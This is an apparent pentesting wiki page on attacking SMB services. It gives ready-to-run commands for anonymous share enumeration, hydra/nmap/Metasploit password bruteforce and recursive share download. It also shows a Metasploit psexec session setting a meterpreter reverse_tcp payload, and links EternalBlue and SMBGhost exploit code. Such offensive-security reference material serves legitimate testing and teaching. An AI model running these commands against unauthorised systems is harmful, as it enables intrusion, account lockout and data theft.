---
authors: ShutdownRepo, mpgn
category: infra
---

# 🛠️ SMB

## Theory

SMB (Server Message Block) is a protocol running on port 445/tcp. It is used to share access to files, printers and serial ports on a network

In 1996 Microsoft releases a customized SMB they call CIFS (Common Internet File System). CIFS can sometimes be referred to as SMB1 (or SMBv1, SMB 1.0). In 2006, Microsoft introduced SMB2 (also referred to as SMB 2.0), a new version of the CIFS protocol. In 2012, Microsoft released SMB3 (a.k.a. SMB 3.0). As of 2020, most systems use SMB 2.0 or above.

In short, SMB is the protocol, CIFS is an old dialect of SMB, and Samba is the Linux/UNIX-like implementation of the SMB protocol (see [this](http://thewindowsupdate.com/2020/02/21/smb-and-null-sessions-why-your-pen-test-is-probably-wrong/)).

## Practice

### Null session

The null session, if not disabled, allows for anonymous/guest access to a network resource when using no credentials

::: tabs

=== UNIX-like

Tools like [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html) (C) and [smbmap](https://github.com/ShawnDEvans/smbmap) (Python) can be used to access SMB shares with null sessions. Null credentials do not have to be explicitly set in this case.

```bash
# List shares
smbclient --list //$IP
smbmap -H $IP

# List shares (implicit null creds)
smbclient --no-pass --list //$IP

# List shares (explicit null creds)
smbclient --user ''%'' --list //$IP
smbmap -u '' -p '' -H $IP

# Open an interactive session to operate on a specific share
smbclient //$IP/$SHARE_NAME
```

[NetExec](https://github.com/Pennyw0rth/NetExec) (Python) can be used to test for null session on multiple hosts.

```bash
netexec smb $TARGETS -u '' -p '' --shares
```


=== Windows

The `net` cmdlet can be used to natively interact with SMB shares and explicitly set null credentials.

> [!CAUTION]
> If null credentials are not explicitly set, Windows will natively use implicit credentials (e.g. Kerberos tickets in cache, logged on user creds or computer account)

```bash
net use \\$IP\$SHARE_NAME '' /user:''
```

:::


### Bruteforce

Tools like [hydra](https://github.com/vanhauser-thc/thc-hydra), [metasploit](https://github.com/rapid7/metasploit-framework) or [nmap](https://github.com/nmap/nmap) can be used to operate authentication bruteforce attacks.

> [!WARNING]
> In addition to not being stealthy at all, and depending on the password policy rules in place, bruteforcing authentication could lead to accounts getting locked out when reaching maximum allowed tries.

```bash
# hydra
hydra -L usernames.txt -P passwords.txt $IP -V -f smb

# Metasploit module to use
msf5 > use auxiliary/scanner/smb/smb_login

# nmap
nmap --script smb-brute -p 445 $IP
```

Valid credentials can then be used to list accessible shares and enumerate the contents of the shares the account has access to.

### Data exfiltration

Tools like [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html) and [NetExec](https://github.com/Pennyw0rth/NetExec) can be used to recursively download a SMB share's content.

```bash
# In an smbclient interactive session
recurse ON
prompt OFF
mget *

# With netexec
netexec smb $TARGETS -u $USERNAME -p $PASSWORD -M spider_plus -o READ_ONLY=False
```

### 🛠️ Authenticated RCE

PSExec exploit module runs on the same principle as the PSExec Windows utility. The exploit embeds a payload into an executable, upload it into the Admin$ share. It then calls the Service Control Manager to approximately start a new rundll32.exe process that will execute our malicious executable.

```
msf > use exploit/windows/smb/psexec
msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
msf exploit(psexec) > show options
Module options:

 Name Current Setting Required Description
 ---- --------------- -------- -----------
 RHOST 192.168.57.131 yes The target address
 RPORT 445 yes Set the SMB service port
 SMBPass no The password for the specified username
 SMBUser Administrator yes The username to authenticate as
```

> [!CAUTION]
> Privileged user credentials required.

> [!CAUTION]
> File uploading, creating, starting, stopping, deletion of services makes it really noisy.

Smbexec works like Psexec, but instead of trying to execute an uploaded executable inside the share, it will try to use directly the binaries _cmd.exe/powershell.exe_. The exploit create an arbitrary service with the _Service File Name_ attribute set to a command string to execute. It echoes the command to be executed to a .bat file, execute it and delete it.

The exploit then get the output of the command via Smb and displays the content. For every command, a new service is created.

[https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)

> [!TIP]
> %COMSPEC% is the environment variable that generaly points to the command line interpreter. (_cmd.exe, powershell.exe_...)

> [!TIP]
> The purpose of using /Q option of cmd is to stop displaying output. (je crois que ça veut dire /quiet à vérifier)

> [!CAUTION]
> Prioritize using Smbexec when you detect a strong AV, `cmd.exe`is a trusted component of the operating system.

> [!CAUTION]
> Privileged user credentials required.

Windows Management Instrumentation is a subsystem of PowerShell that gives high privileged access to system monitoring tools.

Wmiexec has a similar approach to smbexec but it is executing commands through WMI.

[https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)

DCOM is a way for a computer to run a program over the network on a different computer as if the program was running locally.

Dcomexec has a similar approach to psexec but it is executing commands through DCOM.

[https://github.com/SecureAuthCorp/impacket/blob/master/examples/dcomexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/dcomexec.py)

netexec is a swiss army that has featured a lot of the command execution methods mentionned precedently.

One of its feature is to automate the process of executing code via SMB by switching between methods when one fails.

[https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)

### 🛠️ Unauthenticated RCE

Eternalblue is a flaw that allows remote attackers to execute arbitrary code on a target system by sending specially crafted messages to the SMBv1 server. Other related exploits were labelled as`Eternalchampion`, `Eternalromance` and `Eternalsynergy.`

[https://github.com/worawit/MS17-010](https://github.com/worawit/MS17-010)

Smbghost is a bug occuring in the decompression mechanism of client message to a SMBv3.11 server. This bug leads remotely and without any authentication to a BSOD or an RCE on the target.

[https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/](https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/)

[https://github.com/ZecOps/CVE-2020-0796-RCE-POC](https://github.com/ZecOps/CVE-2020-0796-RCE-POC)

Smbleed allows to leak kernel memory remotely, it is also occuring in the same decompression mechanism as smbghost.

In order for the target to be vulnerable, it must have the SMBv3.1.1 implementation running and the compression function enabled, which is on by default.

[https://blog.zecops.com/vulnerabilities/smbleedingghost-writeup-chaining-smbleed-cve-2020-1206-with-smbghost/](https://blog.zecops.com/vulnerabilities/smbleedingghost-writeup-chaining-smbleed-cve-2020-1206-with-smbghost/)

[https://github.com/ZecOps/CVE-2020-1206-POC](https://github.com/ZecOps/CVE-2020-1206-POC)

## Resources

[https://pandorafms.com/blog/what-is-wmi/](https://pandorafms.com/blog/what-is-wmi/)

[https://book.hacktricks.xyz/pentesting/pentesting-smb](https://book.hacktricks.xyz/pentesting/pentesting-smb)

[https://www.varonis.com/blog/dcom-distributed-component-object-model/](https://www.varonis.com/blog/dcom-distributed-component-object-model/)

[https://www.optiv.com/blog/owning-computers-without-shell-access](https://www.optiv.com/blog/owning-computers-without-shell-access)